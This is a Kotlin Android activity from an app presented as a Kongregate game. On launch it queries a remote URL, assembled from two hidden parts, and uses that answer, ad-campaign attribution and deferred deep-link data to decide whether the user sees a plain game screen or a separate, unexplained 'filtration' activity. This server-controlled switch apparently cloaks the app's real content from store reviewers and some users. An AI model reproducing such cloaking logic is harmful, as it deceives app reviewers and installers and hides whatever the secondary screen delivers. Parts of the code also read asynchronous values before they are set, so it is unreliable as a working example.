package com.kongregate.mobile.burritob

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.kongregate.mobile.burritob.AppClass.Companion.AF_DEV_KEY
import com.kongregate.mobile.burritob.AppClass.Companion.linkAppsCheckPart1
import com.kongregate.mobile.burritob.AppClass.Companion.linkAppsCheckPart2
import com.kongregate.mobile.burritob.data.DataStoreRepo
import com.kongregate.mobile.burritob.databinding.ActivityMainBinding
import com.kongregate.mobile.burritob.game.JustAGameActivity
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import javax.inject.Inject


@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var dataStoreRepo: DataStoreRepo

    private lateinit var bindMain: ActivityMainBinding

    var checker: String = "null"
    lateinit var jsoup: String

    private var isAppInstalledFIrstTime = false


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)

        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""

        deePP(this)

        //TODO: delete dovn here
//        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
//        if (prefs.getBoolean("activity_exec", false)) {

        lifecycleScope.async {
            isAppInstalledFIrstTime =
                dataStoreRepo.readBooleanFromDataStore(DataStoreRepo.KEY_ACTIVITY_EXEC)
        }

        if (isAppInstalledFIrstTime) {
            var insiderChecker: String? = ""
            lifecycleScope.launch {
                insiderChecker = dataStoreRepo.readFromDataStore(DataStoreRepo.KEY_CH_DATA)
            }

            when (insiderChecker) {
                "2" -> {
                    skipMe()
                }
                else -> {
                    toTestGrounds()
                }
            }
        } else {

            dataStoreRepo.saveBooleanToDataStore(DataStoreRepo.KEY_ACTIVITY_EXEC, true)

            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(linkAppsCheckPart1 + linkAppsCheckPart2)
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception) {
                }
            }

            when (checker) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afNullRecordedOrNotChecker(1500)
                }
                "2" -> {
                    skipMe()

                }
                "0" -> {
                    toTestGrounds()
                }
            }
        }
    }


    private suspend fun getCheckCode(link: String): String {
        val url = URL(link)
        val oneStr = "1"
        val twoStr = "2"
        val activeStrn = "0"
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnection.inputStream.bufferedReader().readText()) {
                "2" -> {
                    dataStoreRepo.saveToDataStore(DataStoreRepo.KEY_CH_DATA, twoStr)
//                    Hawk.put(KEY_CH, twoStr)
                    twoStr
                }
                "1" -> {
                    oneStr
                }
                else -> {
                    activeStrn
                }
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
//                val hawk1: String? = Hawk.get(KEY_C1)
                val hawk1 = dataStoreRepo.readFromDataStore(DataStoreRepo.KEY_C1_DATA)
                if (hawk1 != null) {
                    toTestGrounds()
                    break
                } else {
                    val hawk11: String? = dataStoreRepo.readFromDataStore(DataStoreRepo.KEY_C1_DATA)
                    delay(timeInterval)
                }
            }
        }
    }


    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {

            val dataGotten = data?.get("campaign").toString()

            dataStoreRepo.saveToDataStore(DataStoreRepo.KEY_C1_DATA, dataGotten)
//            Hawk.put(KEY_C1, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    private fun toTestGrounds() {
        Intent(this, MakeFiltrationActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    private fun skipMe() {
        Intent(this, JustAGameActivity::class.java)
            .also { startActivity(it) }
        finish()
    }

    fun deePP(context: Context) {

        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host

                dataStoreRepo.saveToDataStore(DataStoreRepo.KEY_D1_DATA, params.toString())
//                Hawk.put(KEY_D1, params.toString())
            }
        }
    }
}